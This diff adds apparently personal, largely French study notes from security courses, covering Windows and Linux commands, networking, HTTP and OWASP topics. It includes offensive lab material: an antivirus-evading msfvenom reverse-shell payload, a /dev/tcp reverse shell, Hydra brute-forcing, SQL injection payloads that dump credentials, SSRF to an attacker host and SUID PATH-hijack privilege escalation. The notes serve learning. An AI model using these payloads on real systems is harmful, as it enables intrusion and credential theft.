@@ -1,0 +1,1458 @@
+zsroupe de securite :
+-Admin de domaine
+-Operateur de serveurs
+-Operateur de sauvegarde
+-Operateur de compte
+-Utilisateur de domaine
+-Ordinateurs de domaine
+-controleur de domaine
+
+Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose
+ mstsc POUR ouvrir terminal rdp
+gpupdate /force pour force le gpo
+
+descripteur de securite : DACL ensemble de ACE autorise ou interdire groupe ou Utilisateur d'objet et le maniere de l'acceder, gerer la permission d'acces
+                          SACL journalisation et audit et la surveillance , jerer l'audit d'acces
+
+                          
+
+++++++++++++++++++xxxxxxxxxx++++++++++++++++++++
+
+commande windows : set -> pour verifier votre chemin depuis la ligne de commande et pour voir le 
+                Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps;C:\Users\strategos\AppData\Local\Microsoft\WindowsApps;
+[...]  comme            
+                   ver  -> pour voir le version de windows et aussi systeminfo plus detaille
+                   
+                   help -> Fournit des informations d'aide pour une commande spécifique
+                   cls  -> Efface l'écran Invite de commandes.
+                   ipconfig -> pour le reseau avec option /all
+                   tracert -> comme traceroute de linux
+                   nslookup -> pour voir le ip de domaine
+                   netstat -> Cette commande affiche les connexions réseau actuelles et les ports d'écoute
+                              -h Affiche la page d'aide
+                              -a Affiche toutes les connexions et les ports d'écoute établis
+                              -b montre le programme associé à chaque port d'écoute et à chaque connexion établie
+                              -o révèle l'ID de processus (PID) associé à la connexion
+                              -n utilise un formulaire numérique pour les adresses et les numéros de port
+                              ex : netstat -abon pour options complet
+                   dir -> /a Affiche le fichier cache et system
+                       -> /s Affiche les fichiers dans le répertoire courant et tous les sous-répertoires.
+                   tree
+                   move -> mv
+                   mkdir
+                   rmdir
+                   del or erase
+                   tasklist -> top en linux
+                               /? page d'aide
+                               tasklist /FI "imagename eq sshd.exe" pour chercher le sshd.exe
+                               taskkill /PID 4567 pour tuer le processus
+                   chkdsk -> reparer le ntfs
+                   driverquery -> affiche une liste des pilotes de périphérique installés.
+                   sfc /scannow: analyse les fichiers système pour la corruption et les répare si possible.
+                   /? -> pour afficher le page d'aide
+                   more ou type -> comme le cat                                    
+                   shutdown /r -> pour redemarrer
+                   shutdown /s -> pour eteindre
+                   shutdown /a -> Pour annuler un arrêt planifié sous Windows
+
+
+++++++++++++++++++++++++XXXXXXXXXXXXXXXXXX+++++++++++++++++++++++
+
+
+Model OSI : -> materiel ou physique exemple 
+                    cable, routeur, cable ethernet,  bandes radio WiFi, la bande 2,4 GHz, la bande 5 GHz et la bande de 6 GHz.
+            -> liaison de donnee pour transfer de donnee entre machine 
+                    ex adresse MAC (Media Access Control)
+            -> reseaux 
+                    ex ip (internet protocol),ICMP(internet control Message protocol),VPN(virtual protocol network), IPsec ,SSL/TLS
+            -> transport entre navigateur et le serveur 
+                    ex tcp et udp
+            -> session La couche de session est chargée d'établir, de maintenir et de synchroniser la communication entre les applications exécutées sur différents hôtes.
+                    exemples de la couche de session sont le système de fichiers réseau (NFS) et l'appel de procédure à distance (RPC).
+            -> presentation 
+            -> applications
+
+
+            Numéro de couche    	Nom de la couche                              	Fonction principale                             	Exemples de protocoles et normes
+
+              couche 7              Couche d'application      	      Fournir des services et des interfaces aux applications 	      HTTP, FTP, DNS, POP3, SMTP, IMAP
+              Couche 6 	            Couche de présentation     	      Encodage de données, chiffrement et compression             	  Unicode, MIME, JPEG, PNG, MPEG
+              Couche 5          	Couche de session    	          Établissement, maintenance et synchronisation de sessions       NFS, RPC
+              couche 4          	Couche de transport          	  Communication de bout en bout et segmentation des données       UDP, TCP
+              couche 3 	            Couche réseau                	  Adressage logique et routage entre réseaux 	                  IP, ICMP, IPSec
+              couche 2 	            Couche de liaison de données 	  Transfert de données fiable entre les nœuds adjacents 	      Ethernet (802.3), WiFi (802.11)
+              couche 1 	            Couche physique 	              Supports de transmission de données physiques 	              Signaux électriques, optiques et sans fil
+
+
+
+La RFC 1918 définit les trois gammes d'adresses IP privées suivantes:
+
+    10.0.0.0- 10.255.255.255(10/8)
+    172.16.0.0- 172.31.255.255(172.16/12)
+    192.168.0.0- 192.168.255.255(192.168/16)
+     
+
+    ifconfig ou ip address show simplifie en ip a s
+
+telnet ip port ex telnet 10.10.1.190 80 puis GET / HTTP/1.1 ensuite deux entre
+
+
+++++++++++++++++++++++++++++++++++++++++XXXXXXXXXXXXXXXXXX+++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+cryptographie :  PCI DSS pour la securite de carte bancaire, la norme requise pour le traitement des informations de carte de crédit
+
+
+                -> Plaintext est le message ou les données originaux et lisibles avant qu’ils ne soient chiffrés. Il peut s'agir d'un document, d'une image, d'un fichier multimédia ou de toute autre donnée binaire.
+                -> ciphertext est la version brouillée et illisible du message après le chiffrementest la version brouillée et illisible du message après le chiffrement
+
+                -> Cipher  est un algorithme ou une méthode pour convertir le texte clair en texte chiffré et revenir. 
+
+                -> Encryption est une chaîne de bits que le chiffrement utilise pour chiffrer ou décrypter les données
+
+                -> Decryption est le processus inverse du chiffrement, en convertissant le texte chiffré en texte clair à l'aide d'un chiffrement et d'une clé
+
+
+                ex: symetrique Encryption  DES (Data Encryption Standard),3DES(triple DES),AES(Advanced Encryption standard)
+                    asymetrique Encryption  RSA, Diffie-Hellman, and Elliptic Curve cryptography (ECC)
+
++++++++++++++++++++++++++++++++++++xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx+++++++++++++++++++++++++++++++++++++++
+
+
+metalisploit :  /opt/metasploit/modules# tree -L 1 auxiliary/ fuzzing, crawler, Scanner, brute-force, DoS, collecte d’infos
+                                              ex : 
+                                                  scanner/portscan/tcp → scanner de ports TCP
+
+                                                  scanner/smb/smb_version → détecte la version SMB sur une machine Windows
+
+                                                  dos/http/apache_killer → lance une attaque DoS
+
+                                                  server/capture/http_basic → serveur qui capture les identifiants HTTP Basic
+
+
+                                         tree -L 1 encoders/ encoder l'exploit pour changer le signature et aussi éviter la détection par un antivirus
+                                              ex : Exemples :
+
+                                                            x86/shikata_ga_nai → encodeur polymorphique très connu
+
+                                                            x86/call4_dword_xor
+
+                                                            cmd/echo → encodeur pour les commandes shell
+
+                                                    pratique :
+                                                            msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 \
+                                                            -e x86/shikata_ga_nai -i 5 -f exe -o payload_enc.exe 5fois encode
+
+
+
+                                         tree -L 2 evasion/  pour contourner l'anti-virus
+                                               pratiquer :
+                                                          
+                                                         use evasion/windows/windows_defender_exe
+                                                         set PAYLOAD windows/meterpreter/reverse_tcp
+                                                         set LHOST 192.168.1.10
+                                                         set LPORT 4444
+                                                         run
+                                        
+                                        tree -L 1 exploit/
+                                        tree -L 1 nops/
+                                        tree -L 1 payload/
+payloads/
+    ├── adapters pour transforme le payload(single) en autre executable ex powershell , rendre un payload exécutable via un canal particulier (script, WMI, etc.)
+    ├── singles  payload autonome , tout le comportement est dans le même bloc (ex : créer un utilisateur, lancer une application, ouvrir une reverse shell simple).
+    ├── stagers  petite partie initiale qui établit le canal de communication (écoute, connexion) puis télécharge la suite (la stage).
+    └── stages   la partie volumineuse du payload (ex : Meterpreter complet, modules plus lourds) que le stager télécharge et exécute ensuite.
+
+
+                                        tree -L 1 post/
+
+
+command tres utilise au metalisploit : info , help ex: help set, use, ls, show options, show exploits, history, 
+                        back,search ex: search type:auxiliary telnet, search ms17-010, unset all,setg-unsetg pour ne pas change le valeur a chaque Module et global
+                                exploit -z, check, sessions, sessions -i 2 ,background pour quitter le meterpreter
+                                       set RHOSTS file:/root/Desktop/targets.txt 
+                                                                     cat targes.txt 10.122.111.3
+                                                                                    10.122.111.4
+                                                                                    10.122.111.7
+                                                                                    10.122.111.4
+search -f flag*
+ps
+migrate PID
+
+
+++++++++++++++++++++++++++++++++++++XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX+++++++++++++++++++++++++++++++++++++++=
+
+URL: Uniform Resource Locator
+
+                Scheme                 Host/Domain      path        fragment   
+                  |                         |             |            |     
+                  V                         V             V            V
+                http://user:password@tryhackme.com:80/view-room?id=1#task3
+                            ^                       ^             ^
+                            |                       |             |
+                          User                    Port       query String
+http message => http requests
+                http responses
+http contenu => start line
+                headers
+                Empty line
+                Body
+ 
+http requests =>
+
+                 Request line
+
+                 Request line Example: METHOD /path HTTP/version -> http methods : - GET recuperer le donne au serveur
+                                                                                   - POST creer ou mettre a jour le donnee
+                                                                                   - PUT replacer ou mettre le donne au serveur
+                                                                                   - DELETE supprimer
+                                                                                   - PATCH Met à jour une partie d’une ressource, utile pour une petit changement
+                                                                                     pas remplacer tout le donne
+                                                                                   - HEAD pour recuperer simplement le headers, sans telecharger le body
+                                                                                   - OPTIONS Vous indique quelles méthodes sont disponibles pour une ressource spécif                                                                                     ique, aidant ainsi les clients à comprendre ce qu'ils peuvent faire avec le serv                                                                                     eur.
+                                                                                   - TRACE comme OPTIONS mais affiche les methodes autorisent 
+                                                                                   - CONNECT utiliser pour une connection securise comme HTTPS
+
+                                                                 -> URL PATH     : - ex : the URL https://tryhackme.com/api/users/123:, the path /api/users/123 
+
+                                                                 Attaque possible : 
+                                                                                   Validate the URL path to prevent unauthorised access
+                                                                                   Sanitise the path to avoid injection attacks
+                                                                                   Protect sensitive data by conducting privacy and risk assessments
+
+-> HTTP version :
+
+HTTP/0.9 (1991)
+The first version, only supported GET requests.
+
+HTTP/1.0 (1996)
+Added headers and better support for different types of content, improving caching.
+
+HTTP/1.1 (1997)
+Brought persistent connections, chunked transfer encoding, and better caching. It’s still widely used today. avec keep alive , pipelining requests,transfer-encoding 
+
+HTTP/2 (2015)
+Introduced features like multiplexing, header compression, and prioritisation for faster performance.
+
+HTTP/3 (2022)
+Built on HTTP/2, but uses a new protocol (QUIC) for quicker and more secure connections.
+
+Although HTTP/2 and HTTP/3 offer better speed and security, many systems still use HTTP/1.1 because it’s well-supported and works with most existing setups. However, upgrading to HTTP/2 or HTTP/3 can provide significant performance and security improvements as more systems adopt them.
+
+
+
+                Requests headers        Exemple                                   Description
+
+
+                -> Host                 Host: tryhackme.com                    Specifies the name of the web server the request is for.
+                -> User-Agent           User-Agent: Mozilla/5.0                Shares information about the web browser the request is coming from.
+                -> Refer                Refer: https://www.google.com/         Indicates the URL from which the request came from.
+                -> Cookie               Cookie: user_type=student;             Information the web server previously asked 
+                                        room=introtowebapplication;            he web browser to store is held in cookies. 
+                                        room_status=in_progress
+                -> Content-Type         Content-Type: application/json         Describes what type or format of data is in the request.
+
+
+                Request body
+
+                formatage de donnée : URL Encoded (application/x-www-form-urlencoded)
+                                            exemple: POST /profile HTTP/1.1
+                                                     Host: tryhackme.com
+                                                     User-Agent: Mozilla/5.0
+                                                     Content-Type: application/x-www-form-urlencoded
+                                                     Content-Length: 33
+
+                                                     name=Aleksandra&age=27&country=US                                     
+
+                                      Form Data (multipart/form-data)
+                                            exemple: POST /upload HTTP/1.1
+                                                     Host: tryhackme.com
+                                                     User-Agent: Mozilla/5.0
+                                                     Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+
+                                                     ----WebKitFormBoundary7MA4YWxkTrZu0gW
+                                                     Content-Disposition: form-data; name="username"
+
+                                                     aleksandra
+                                                     ----WebKitFormBoundary7MA4YWxkTrZu0gW
+                                                     Content-Disposition: form-data; name="profile_pic"; filename="aleksandra.jpg"
+                                                     Content-Type: image/jpeg
+
+                                                     [Binary Data Here representing the image]
+                                                     ----WebKitFormBoundary7MA4YWxkTrZu0gW--
+
+                                      JSON (application/json)
+                                            exemple: POST /api/user HTTP/1.1
+                                                     Host: tryhackme.com
+                                                     User-Agent: Mozilla/5.0
+                                                     Content-Type: application/json
+                                                     Content-Length: 62
+
+                                                     {
+                                                         "name": "Aleksandra",
+                                                         "age": 27,
+                                                         "country": "US"
+                                                     }
+                                      XML  (application/xml)
+                                            exemple: POST /api/user HTTP/1.1
+                                                     Host: tryhackme.com
+                                                     User-Agent: Mozilla/5.0
+                                                     Content-Type: application/xml
+                                                     Content-Length: 124
+
+                                                     <user>
+                                                           <name>Aleksandra</name>
+                                                           <age>27</age>
+                                                           <country>US</country>
+                                                     </user>
+
+
+http response : status line => http version
+                               status code  -|  
+                               reason Phrase |
+                                             V
+                                             informational responses (100-199) il recoit le request et attende le reste
+                                             Successful Responses (200-299) le transfert est succes et il envoye le donner demande
+                                             Redirection Messages (300-399) le donnes qui vient de la request est change d'une notre emplacement
+                                             Client Error responses (400-499) le requete a une probleme l'URL est faux, ou le donne formulaire est fausse ou manquant
+                                             Server Error Responses (500-599) le serveur a une probleme quand il essaye de repondre a la requete
+                                             100 (Continue) le serveur a le request et attend le reste
+                                             200 (Ok) le request est envoye avec succes et envoye le ressource demande
+                                             301 (Moved Permanently) Redirection a une autre lien
+                                             404 (Not Found)
+                                             501 (Internal Server Error)
+
+                response headers => Date
+                                        Exemple: Date: Fri, 23 Aug 2024 10:43:21 GMT
+                                    Content-Type
+                                        Exemple: Content-Type: text/html; charset=utf-8
+                                    Server:
+                                        Exemple: Server: nginx
+                                    Set-Cookie:
+                                        Exemple: Set-Cookie: sessionId=38af1337es7a8 terme technique: HttpOnly,Secure
+                                    Cache-Control:
+                                        Exemple: max-age=600
+                                    Location:
+                                        Exemple: Location: /index.html
+
+
+                security headers :  providing mitigations against attacks like Cross-Site Scripting (XSS), clickjacking, and other and  https://securityheaders.io/ 
+                                  -> Content-Security-Policy (CSP)
+default-src
+- which specifies the default policy of self, which means only the current website.
+
+script-src
+- which specifics the policy for where scripts can be loaded from, which is self along with scripts hosted on https://cdn.tryhackme.com
+
+style-src
+- which specifies the policy for where style CSS style sheets can be loaded from the current website (self)
+exemple: Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.tryhackme.com; style-src 'self'
+
+
+                                 -> Strict-Transport-Security (HSTS)
+
+    max-age
+    - This is the expiry time in seconds for this setting
+
+    includeSubDomains
+    - An optional setting that instructs the browser to also apply this setting to all subdomains.
+
+    preload
+    - This optional setting allows the website to be included in preload lists. Browsers can use preload lists to enforce HSTS before even having their first visit to a website.
+
+Exemple: Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
+
+                                 -> X-Content-Type-Options
+
+nosniff
+- This directive instructs the browser not to sniff or guess the MIME type. 
+
+                                 Exemple: X-Content-Type-Options: nosniff
+
+                                 -> Referrer-Policy
+no-referrer
+- This completely disables any information being sent about the referrer
+
+same-origin
+- This policy will only send referrer information when the destination is part of the same origin. This is helpful when you want referrer information passed when hyperlinks are within the same website but not outside to external websites.
+
+strict-origin
+- This policy only sends the referrer as the origin when the protocol stays the same. So, a referrer is sent when an HTTPS connection goes to another HTTPS connection.
+
+strict-origin-when-cross-origin
+- This is similar to strict-origin except for same-origin requests, where it sends the full URL path in the origin header.
+
+Exemple: 
+    Referrer-Policy: no-referrer
+    Referrer-Policy: same-origin
+    Referrer-Policy: strict-origin
+    Referrer-Policy: strict-origin-when-cross-origin
+
+
+++++++++++++++++++++++++++xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx+++++++++++++++++++++++++++++
+
+Top OWASP ZAP
+
+   
+    Broken Access Control ex: IDOR
+    Cryptographic Failures , outils : crackstation.net, sqlite3 cmd .tables; PRAGMA table_info(Table);SELECT * FROM TABLE;
+    Injection ex: SQL injecton, Command injection
+                  ex: echo "my name $(whoami)"     whoami
+                                                   id
+                                                   ifconfig/ip addr
+                                                   uname -a
+                                                   ps -ef    
+                                                   cat /etc/alpine-release
+    
+    Insecure Design
+    Security Misconfiguration : Existence d'un console ouverte comme python
+                  import os; print(os.popen("ls -l").read())
+    Vulnerable and Outdated Components : peut importer le mot sur le site il faut chercher au navigateur si c'est un outils web pas a jour
+                   Exploit-DB , Scanning
+    Identification and Authentication Failures
+                   Ex : Brute force attack, use of weak credential, weak session cookie, Dans le lab , deux utilisateur ont le meme username mais l'autre avec
+                   d'espace au debut , alors le serveur pense c'est une meme compte alors les deux ont acces au un compte
+    Software and Data Integrity Failures
+                   Ex : md5sum WinSCP-5.21.5-Setup.exe  
+                        sha1sum WinSCP-5.21.5-Setup.exe 
+                        sha256sum WinSCP-5.21.5-Setup.exe
+                  : mitigation <script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossori                        gin="anonymous"></script>
+                    
+                    https://www.srihash.org/ pour le lien web
+               Mitigation:  JSON Web Tokens (JWT) avec https://appdevtools.com/base64-encoder-decoder pour decode le base64
+Security Logging & Monitoring Failures
+               The information stored in logs should include the following:
+
+               HTTP status codes
+               Time Stamps
+               Usernames
+               API endpoints/page locations
+               IP addresses
+               
+Server-Side Request Forgery (SSRF)
+                   Enumerate internal networks, including IP addresses and ports.
+                   Abuse trust relationships between servers and gain access to otherwise restricted services.
+                   Interact with some non-HTTP services to get remote code execution (RCE).
+
+                   vuln => https://www.mysite.com/sms?server=srv3.sms.thm&msg=ABC
+                   https://www.mysite.com/sms?server=attacker.thm&msg=ABC => https://attacker.thm/api/send?msg=ABC => nc -lvp 80 on obtient un api-key
+
+                   http://10.10.48.190:8087/download?server=http://localhost:8087/admin%23&id=75482342 le %23 devient # au cote serveur
+
+
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX+++++++++++++++++++++++++++++++
+
+HYDRA
+
+sudo hydra <username> <wordlist> 10.10.203.200 http-post-form "<path>:<login_credentials>:<invalid_response>"
+ex : hydra -l molly -P /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt 10.10.203.200 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
+
+ hydra -l molly -P /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt 10.10.203.200 -t 4 ssh -V
+
+
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx++++++++++++++++++++++++++++++++++++++++
+
+SQL injection
+
+1- In-Band SQL Injection
+    ex: https://website.thm/blog?id=2;-- => SELECT * from blog where id=2;--
+    ;-- : ; pour la fin la fin de statement , -- pour commenter le reste
+2- Error-Based SQL Injection
+
+3- Union-Based SQL injection
+
+=======================
+     https://website.thm/article?id=1' le ' pour declencher l'erreur
+     https://website.thm/article?id=1 UNION SELECT 1,2,3 pour counte le colonne
+                                    0 UNION SELECT 1,2,3 pour mettre le premier resultat vide et afficher 1,2,3
+                                                       database() affiche le nom de base de donne
+
+            Pour le table           0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
+                                    group_concat() = pour avoir le colonne de table_name
+                                    information_schema = pour affiche l'info sur l'access de l'utilisateur sur la database et tout l'user peut acceder a son info
+
+            Pour le columns         0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
+            Pour le contenu         0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
+
+
+            Blind SQLi - Authentication Bypass
+
+            select * from users where username='%username%' and password='%password%' LIMIT 1;
+            exploit ' OR 1=1;-- 
+
+            Blind SQLi Boolean Based
+
+select * from users where username = 'admin123' UNION select 1,2,3 where database() like '%';-- et puis testons le a% jusqu'a ce qu'on obtiens la nom de database
+qui est sqli_three
+admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';-- pour le nom de la table qui est users
+admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';-- pour verifier le nom de column
+admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';
+
+admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';
+admin123' UNION SELECT 1,2,3 from users where username like 'a% chercher pour le nom utilisateur
+admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a% pour le mot de passed
+          
+          Blind SQLi time based comme Boolean mais avec sleep(5)
+
+          admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--
+
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX++++++++++++++++++++++++++++++++++++++++++++++++++
+
+
+Dans burpsuite 
+          /about/0 UNION ALL SELECT column_name,null,null,null,null FROM information_schema.columns WHERE table_name="people"
+          /about/0 UNION ALL SELECT group_concat(column_name),null,null,null,null FROM information_schema.columns WHERE table_name="people"
+          0 UNION ALL SELECT notes,null,null,null,null FROM people WHERE id = 1
+
+
+==================================================================xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx===================================================
+
+Passive reconnaissance => passive regarder simplement sans rien faire
+                      active  avec interaction
+
+
+PASSIVE
+
+outils => whois ex  whois tryhackme.com 
+      nslookup options domaine server 
+                               ex : cloudflare 1.1.1.1 and 1.0.0.1
+                                    google 8.8.8.8 and 8.8.4.4
+                                    Quad9 9.9.9.9 and 149.112.112.112
+
+
+Query type 	Result
+A 	        IPv4 Addresses
+AAAA     	IPv6 Addresses
+CNAME   	Canonical Name
+MX 	        Mail Servers
+SOA     	Start of Authority
+TXT     	TXT Records
+
+ex : nslookup -type=A tryhackme.com 1.1.1.1 ; nslookup -type=a tryhackme.com 1.1.1.1
+
+dig @SERVER DOMAIN_NAME TYPE.
+
+SERVER is the DNS server that you want to query.
+DOMAIN_NAME is the domain name you are looking up.
+TYPE contains the DNS record type, as shown in the table provided earlier.
+
+
+https://dnsdumpster.com/ pour trouver le subdomains
+
+ACTIVE
+
+outils => ping,traceroute,telnet,nc
+
+-l 	Listen mode
+-p 	Specify the Port number
+-n 	Numeric only; no resolution of hostnames via DNS
+-v 	Verbose output (optional, yet useful to discover any bugs)
+-vv 	Very Verbose (optional)
+-k 	Keep listening after client disconnects
+
+
+=====================================================================XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX===================================================
+
+NMAP
+
+Enumeration target
+
+nmap -iL list_of_hosts.txt
+nmap -sL TARGETS. This option will give you a detailed list of the hosts that Nmap will scan without scanning 
+
+-sL	Liste les cibles sans scanner
+-n	Désactive la résolution DNS
+
+Nmap host discovery Using ARP
+
+nmap -PR -sn MACHINE_IP/24 to discover all the live systems on the same subnet as our target machine with Adresse MAC
+nmap -sn TARGETS no ARP no port scan
+arp-scan --localnet or simply arp-scan -l. This command will send ARP queries to all valid IP addresses on your local networks.
+sudo arp-scan -I eth0 -l => your system has more than one interface and you are interested in discovering the live hosts on one of them, you can specify the interface using -I
+
+ex : sudo arp-scan 10.10.210.6/24
+
+Nmap host discovery Using ICMP 
+
+nmap -PE -sn TARGET nmap -PE -sn MACHINE_IP/24 icmp echo request and icmp echo reply case host live 
+nmap -PP -sn 10.10.68.220/24 icmp timestamp request and reply case host live
+nmap -PM -sn MACHINE_IP/24 icmp adress Mask request and reply case host live
+
+Nmap host discovery using tcp and udp
+
+nmap -PS21-25 or -PS80,443,8080 target syn scan case tcp port is open
+nmap -PS -sn MACHINE_IP/24 
+sudo    -PA pour ACK scan tcp port is open or close
+nmap -PU -sn 10.10.68.220/24 UDP scan
+
+masscan MACHINE_IP/24 -p443
+masscan MACHINE_IP/24 -p80,443
+masscan MACHINE_IP/24 -p22-25
+masscan MACHINE_IP/24 ‐‐top-ports 100
+
+Using reverse-DNS lookup
+
+-R to query the DNS server even for offline host
+you can add the --dns-servers DNS_SERVER 
+
+
+
+Scan Type                      	Example Command
+ARP Scan                    	sudo nmap -PR -sn MACHINE_IP/24
+ICMP Echo Scan 	                sudo nmap -PE -sn MACHINE_IP/24
+ICMP Timestamp Scan 	        sudo nmap -PP -sn MACHINE_IP/24
+ICMP Address Mask Scan 	        sudo nmap -PM -sn MACHINE_IP/24
+TCP SYN Ping Scan 	            sudo nmap -PS22,80,443 -sn MACHINE_IP/30
+TCP ACK Ping Scan 	            sudo nmap -PA22,80,443 -sn MACHINE_IP/30
+UDP Ping Scan 	                 sudo nmap -PU53,161,162 -sn MACHINE_IP/30
+
+Remember to add -sn if you are only interested in host discovery without port-scanning. Omitting -sn will let Nmap default to port-scanning the live hosts. 
+
+
+
+-n 	no DNS lookup
+-R 	reverse-DNS lookup for all hosts
+-sn 	host discovery only
+
+
+===================================================================xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx==============================================
+
+Vulnerable 
+CSVV et VPR
+NVD
+exploid-db
+
+===================================================================XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX+===========================================
+
+privilege escalation
+
+hostname
+
+uname -a
+
+/proc/version
+
+/etc/issue This file usually contains some information about the operating system but can easily be customized or changed
+
+ps command
+ps -A  : View all running processes
+ps axjf: View process tree
+ps aux : no tree with all users
+
+env : variable environnement
+
+sudo -l : command can be used to list all commands your user can run
+
+ls -la
+
+id 
+
+/etc/passwd
+
+cat /etc/passwd | cut -d ":" -f 1
+
+cat /etc/passwd | grep home
+
+history
+
+ifconfig
+
+ip route
+
+netstat 
+     netstat -a: shows all listening ports and established connections.
+     netstat -at or netstat -au can also be used to list TCP or UDP protocols respectively.
+     netstat -l: list ports in “listening” mode. These ports are open and ready to accept incoming connections. This can be used with the “t” option to list only         ports that are listening using the TCP protocol (below) ex netstat -lt 
+     netstat -s: list network usage statistics by protocol (below) This can also be used with the -t or -u options to limit the output to a specific protocol.
+     netstat -tp: list connections with the service name and PID information. This can also be used with the -l option to list listening ports ex netstat -ltp
+     netstat -i: Shows interface statistics. We see below that “eth0” and “tun0” are more active than “tun1”.
+     
+     The netstat usage you will probably see most often in blog posts, write-ups, and courses is netstat -ano which could be broken down as follows;
+
+             -a: Display all sockets
+             -n: Do not resolve names
+             -o: Display timers
+             
+     netstat -ano
+
+find
+
+find . -name flag1.txt: find the file named “flag1.txt” in the current directory
+find /home -name flag1.txt: find the file names “flag1.txt” in the /home directory
+find / -type d -name config: find the directory named config under “/”
+find / -type f -perm 0777: find files with the 777 permissions (files readable, writable, and executable by all users)
+find / -perm a=x: find executable files
+find /home -user frank: find all files for user “frank” under “/home”
+find / -mtime 10: find files that were modified in the last 10 days
+find / -atime 10: find files that were accessed in the last 10 day
+find / -cmin -60: find files changed within the last hour (60 minutes)
+find / -amin -60: find files accesses within the last hour (60 minutes)
+find / -size 50M: find files with a 50 MB size
+     find / -size +100M
+     find / -size +100M -type f 2> /dev/null
+find / -writable -type d 2>/dev/null : Find world-writeable folders
+find / -perm -222 -type d 2>/dev/null: Find world-writeable folders
+find / -perm -o w -type d 2>/dev/null: Find world-writeable folders
+find / -perm -o x -type d 2>/dev/null : Find world-executable folders
+find / -name perl*
+find / -name python*
+find / -name gcc*
+find / -perm -u=s -type f 2>/dev/null: Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user. 
+find / -type f -perm -04000 -ls 2>/dev/null will list files that have SUID or SGID bits set.
+find, locate, grep, cut, sort, etc.
+
+Automated and enumeration tools
+
+LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
+LinEnum: https://github.com/rebootuser/LinEnum
+LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
+Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
+Linux Priv Checker: https://github.com/linted/linuxprivchecker
+
+
+Research sources:
+
+Based on your findings, you can use Google to search for an existing exploit code.
+Sources such as https://www.cvedetails.com/ can also be useful.
+Another alternative would be to use a script like LES (Linux Exploit Suggester) but remember that these tools can generate false positives (report a kernel vulne    rability that does not affect the target system) or false negatives (not report any kernel vulnerabilities although the kernel is vulnerable).
+https://gtfobins.github.io/ is a valuable source that provides information on how any program, on which you may have sudo rights, can be used.
+
+unshadow passwd.txt shadow.txt > passwords.txt => john password.txt
+
+openssl passwd -1 -salt THM password1 => $1$THM$qrHjiosjgoiuWgerguegrgrg1 le salt = thm , password = password1
+
+getcap -r / 2>/dev/null
+
+cat /etc/crontab
+            bash -i >& /dev/tcp/ip/port 0>&1 nc -nlvp 6666
+
+#include <unistd.h>
+int main() {
+
+setuid(0);
+setgid(0);
+system("thm");
+return 0;
+}
+gcc path_exp.c -o path -w
+chmod u+s path
+A simple search for writable folders can done using the “find / -writable 2>/dev/null" avec cut -d "/" -f 2 | sort -u
+
+echo $PATH
+
+find / -writable 2>/dev/null | grep usr | cut -d "/" -f 2,3 | sort -u 
+find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u We have added “grep -v proc” to get rid of the many results related to running processes.
+export PATH=/tmp:$PATH
+cd /tmp
+echo"/bin/bash" > thm
+chmod 777 thm
+cd Desktop
+./path
+NFS (Network File Sharing) configuration is kept in the /etc/exports
+
+We will start by enumerating mountable shares from our attacking machine. showmount -e ip target
+mount -o rw ip_target:/nomDossierPartage ./
+
+
+======================================================================XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX==================================
